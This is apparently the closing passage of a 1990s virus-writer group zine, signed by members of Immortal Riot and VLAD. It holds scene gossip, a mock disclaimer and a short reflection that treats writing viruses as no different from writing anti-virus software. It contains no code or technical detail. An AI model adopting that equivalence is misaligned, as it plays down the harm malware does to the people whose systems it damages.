+Raver was too busy fooling around with Jennie.
+TUIR was too busy to try to get Emma and when she crashed he rather
+took another, namely Anna.
+Redback was too busy taking stupid photo's for blackmailing purposes!
+(You arse!)
+
+% AV meets VX %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+This was *SO COOL!* No further details.. (h0h0 and a bottle of ROM. )
+So, for short: People are people. One person writes viruses another
+programs anti-virus software. Is it really any different? It's
+both programming done by persons. Nothing else, really.
+
+% Disclaimer %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Do I really need one?
+Well... Don't read this text, it might damage you seriously.
+
+% Future %
+ÄÄÄÄÄÄÄÄÄÄ
+Personally I will have a lot of explaining to do "Err. I'm sorry,
+but it was just sex, right?" this very day. For the rest of this day
+and the future, I dunno. Do you? You could die within one hour, really.
+Noone knows, fate won't exist. God is created by humans and not reverse.
+
+% Closing words %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+I thought about writing about a lot of interesting things.. But I didn't
+so the above expressed shit is what you get. I know it sucks and if you
+tell me else, don't :).
+
+
+
+		    > P.E.A.C.E. <
+
+
+
+- The Unforgiven/Immortal Riot.
+
+-----------------------------------------------------------------------------
+
+that's it.  For all you kids who think I'm such a legend haxorer, wake up and 
+smell the coffee!!  You have been been goofed you fizewl.  The whole thing
+was a contribution from The Unforgiven!!!  Punk.  Fool.  SUCKA.
+
+The Man of a Million Larfs (and leisure suits),
+
+  Quantum / VLAD
